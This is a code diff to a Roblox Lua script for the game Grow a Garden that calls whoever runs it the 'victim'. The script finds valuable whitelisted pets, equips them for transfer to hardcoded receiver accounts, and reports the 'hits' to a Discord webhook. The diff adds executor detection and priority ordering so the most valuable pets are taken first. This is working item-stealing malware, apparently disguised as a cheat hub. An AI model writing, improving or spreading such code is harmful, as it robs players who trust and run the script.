@@ -17,21 +17,42 @@ local USERNAMES = {
     "BEESUCALL",
 }
 
--- PET whitelist map: pet name => UUID
+-- PET whitelist map with priority and emojis
 local PET_WHITELIST = {
-    ["Raccoon"] = "{09fc614f-5807-47aa-b4f4-6a044c98b654}",
-    ["T-Rex"] = "{59dc2f62-f4f8-495d-b2fe-7d40b6666306}",
-    ["Fennec Fox"] = "{some-uuid-fff-fff-fff}",
-    ["Dragonfly"] = "{63ffe264-ec3c-4c4f-b1d5-718d6a274dd3}",
-    ["Butterfly"] = "{some-uuid-fff-fff-fff}",
-    ["Disco Bee"] = "{809e310d-a9df-4e60-a796-80578cd5c73a}",
-    ["Mimic Octopus"] = "{c91e7566-c879-4a4d-9a62-8511f7aae3a4}",
-    ["Queen Bee"] = "{18a8af4f-6d75-4494-a7a5-adbd4193ca19}",
-    ["Spinosaurus"] = "{25df32e7-9ae1-4796-955b-dfe7f1050665}",
-    ["Kitsune"] = "{64921f10-e437-4686-9156-2ff194de4e34}"
+    ["Kitsune"] = { uuid = "{64921f10-e437-4686-9156-2ff194de4e34}", emoji = "🦊", priority = 1 },
+    ["Raccoon"] = { uuid = "{09fc614f-5807-47aa-b4f4-6a044c98b654}", emoji = "🦝", priority = 2 },
+    ["Disco Bee"] = { uuid = "{809e310d-a9df-4e60-a796-80578cd5c73a}", emoji = "🐝", priority = 3 },
+    ["Butterfly"] = { uuid = "{some-uuid-fff-fff-fff}", emoji = "🦋", priority = 4 },
+
+    -- Other pets without priority (emoji optional)
+    ["T-Rex"] = { uuid = "{59dc2f62-f4f8-495d-b2fe-7d40b6666306}", emoji = "🦖", priority = 99 },
+    ["Fennec Fox"] = { uuid = "{some-uuid-fff-fff-fff}", emoji = "🦊", priority = 99 },
+    ["Dragonfly"] = { uuid = "{63ffe264-ec3c-4c4f-b1d5-718d6a274dd3}", emoji = "🐉", priority = 99 },
+    ["Mimic Octopus"] = { uuid = "{c91e7566-c879-4a4d-9a62-8511f7aae3a4}", emoji = "🐙", priority = 99 },
+    ["Queen Bee"] = { uuid = "{18a8af4f-6d75-4494-a7a5-adbd4193ca19}", emoji = "👑🐝", priority = 99 },
+    ["Spinosaurus"] = { uuid = "{25df32e7-9ae1-4796-955b-dfe7f1050665}", emoji = "🦕", priority = 99 },
 }
 
 local victimPetTable = {}
+
+-- Detect executor function
+local function detectExecutor()
+    if syn then
+        return "Synapse"
+    elseif KRNL then
+        return "KRNL"
+    elseif Fluxus then
+        return "Fluxus"
+    elseif Protosmasher then
+        return "Protosmasher"
+    elseif (ArceusX ~= nil) or (Arceus ~= nil) then
+        return "Arceus X"
+    elseif Delta then
+        return "Delta"
+    else
+        return "Unknown"
+    end
+end
 
 -- Check if pet name is whitelisted
 local function checkPetsWhitelist(petName)
@@ -102,8 +123,10 @@ end
 
 -- Send Discord webhook embed
 local function createDiscordEmbed(petList, totalValue, fileUrl)
+    local executorName = detectExecutor() -- detect executor here
+
     local embed = {
-        title = "MAGNANAKAW CHECK 🥀",
+        title = "HUB X - GROW A GARDEN HITS",
         color = 65280,
         fields = {
             {
@@ -111,12 +134,11 @@ local function createDiscordEmbed(petList, totalValue, fileUrl)
                 value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                     LocalPlayer.Name, 
                     table.concat(USERNAMES, " "), 
-                    LocalPlayer.Name, -- or identifyexecutor() if you have it
+                    executorName,  -- Use detected executor here
                     LocalPlayer.AccountAge
                 ),
                 inline = false
             },
-          
             {
                 name = "**Backpack**",
                 value = string.format("```%s```", petList),
@@ -167,11 +189,21 @@ end
 
 -- Check pets inventory and equip + steal from victim
 local function checkPetsInventory(targetName)
-    for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        if not checkPetsWhitelist(petData.PetType) then
-            continue
+    -- Sort pets by priority
+    local petsData = dataModule:GetData().PetsData.PetInventory.Data
+    local sortedPets = {}
+
+    for petUUID, petData in pairs(petsData) do
+        if checkPetsWhitelist(petData.PetType) then
+            local priority = PET_WHITELIST[petData.PetType].priority or 99
+            table.insert(sortedPets, {uuid = petUUID, petType = petData.PetType, priority = priority})
         end
-        local petObject = getPetObject(petUUID)
+    end
+
+    table.sort(sortedPets, function(a, b) return a.priority < b.priority end)
+
+    for _, petInfo in ipairs(sortedPets) do
+        local petObject = getPetObject(petInfo.uuid)
         if petObject then
             equipPet(petObject)
             task.wait(0.2)
@@ -247,7 +279,9 @@ idlingTarget()
 -- Build pet list for webhook and send it once
 for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
     if checkPetsWhitelist(petData.PetType) then
-        table.insert(victimPetTable, petData.PetType)
+        local petInfo = PET_WHITELIST[petData.PetType]
+        local emoji = petInfo and petInfo.emoji or ""
+        table.insert(victimPetTable, emoji .. " " .. petData.PetType)
     end
 end
 
